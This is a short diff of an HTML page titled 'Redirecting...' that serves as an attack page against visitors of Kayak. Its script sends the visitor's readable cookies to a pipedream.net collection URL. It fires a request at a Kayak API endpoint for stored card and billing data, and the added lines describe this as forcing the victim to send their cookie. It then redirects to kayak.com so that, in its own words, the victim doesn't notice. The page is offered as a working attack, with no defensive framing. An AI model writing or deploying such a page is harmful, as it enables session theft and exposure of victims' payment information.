@@ -3,10 +3,13 @@
   <head>
     <title>Redirecting...</title>
     <script>
-      // Steal the cookie and send it to your trap
+      // 🛑 Steal any cookies that JS can access (if not HttpOnly)
       new Image().src = "https://eoh3rxe2o8pbhuj.m.pipedream.net/?cookie=" + document.cookie;
 
-      // Then redirect them to Kayak
+      // 🚀 Force the victim to send their cookie to a sensitive API endpoint
+      new Image().src = "https://www.kayak.com/api/whisky/V1/cc/list?includeBilling=true&knownTravelerNumberApiVersion=v2";
+
+      // 🔁 Redirect them to Kayak so they don’t notice anything
       setTimeout(() => {
         window.location.href = "https://www.kayak.com";
       }, 1500);
@@ -16,3 +19,4 @@
     Redirecting to Kayak...
   </body>
 </html>
+
